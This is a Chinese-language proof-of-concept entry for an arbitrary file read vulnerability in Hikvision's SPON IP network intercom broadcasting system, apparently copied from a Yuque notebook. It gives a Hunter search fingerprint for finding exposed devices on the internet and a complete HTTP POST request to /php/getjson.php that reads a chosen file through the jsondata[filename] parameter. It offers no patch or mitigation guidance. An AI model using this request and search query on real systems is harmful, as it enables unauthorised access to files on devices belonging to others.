# 海康威视SPON IP网络对讲广播系统getjson存在任意文件读取漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">Hikvision Intercom Broadcasting System是中国海康威视（Hikvision）公司的一个对讲广播系统。海康威视SPON IP网络对讲广播系统getjson存在任意文件读取漏洞。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 海康威视SPON IP网络对讲广播系统

# 三、资产测绘
+ Hunter：`web.body="vendors/custom/html5.min.js"`
+ 特征

![1704857140903-8dadddb1-8d90-42a6-9179-3cd4dca00c8b.png](./img/0U2NLRBKAT56CH1C/1704857140903-8dadddb1-8d90-42a6-9179-3cd4dca00c8b-116718.png)

# 四、漏洞复现
```java
POST /php/getjson.php HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

jsondata[filename]=./ocx.json
```

![1704944421700-582b17ab-4acb-41dc-b15d-ecb1594c9772.png](./img/0U2NLRBKAT56CH1C/1704944421700-582b17ab-4acb-41dc-b15d-ecb1594c9772-780698.png)



> 更新: 2024-02-29 23:57:17  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/irhi1snf5yt1z0se>